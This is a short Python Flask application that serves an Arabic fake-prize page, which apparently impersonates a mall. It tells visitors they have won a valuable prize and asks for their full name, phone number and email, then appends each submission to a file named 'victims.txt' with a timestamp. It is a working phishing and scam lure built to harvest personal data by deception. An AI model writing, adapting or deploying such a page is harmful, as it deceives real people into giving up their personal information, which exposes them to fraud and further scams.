from flask import Flask, request, render_template_string
import time

app = Flask(__name__)

# قالب HTML مع نموذج استقبال البيانات
HTML = """
<!DOCTYPE html>
<html dir="rtl" lang="ar">
<head>
    <meta charset="UTF-8">
    <title>جائزة مول العبوش الكبرى!</title>
    <style>
        body { font-family: 'Arial Arabic'; text-align: center; margin-top: 50px; }
        .prize-box { background: gold; padding: 2em; border-radius: 15px; display: inline-block; }
    </style>
</head>
<body>
    <div class="prize-box">
        <h1>مبروك! فزت بجائزة قيمة!</h1>
        <form method="POST" action="/submit">
            <input type="text" name="name" placeholder="الاسم الكامل" required><br><br>
            <input type="tel" name="phone" placeholder="رقم الجوال" required><br><br>
            <input type="email" name="email" placeholder="البريد الإلكتروني" required><br><br>
            <button type="submit">استلام الجائزة</button>
        </form>
    </div>
</body>
</html>
"""

@app.route('/')
def index():
    return render_template_string(HTML)

@app.route('/submit', methods=['POST'])
def submit():
    # استقبال البيانات من النموذج
    name = request.form['name']
    phone = request.form['phone']
    email = request.form['email']
    
    # حفظ البيانات في ملف
    with open('/home/Muhammadtd/mysite/victims.txt', 'a') as f:
        f.write(f"Name: {name}, Phone: {phone}, Email: {email}, Time: {time.ctime()}\n")
    
    return "تم استقبال البيانات بنجاح! جاري تحضير جائزتك..."

if __name__ == '__main__':
    app.run()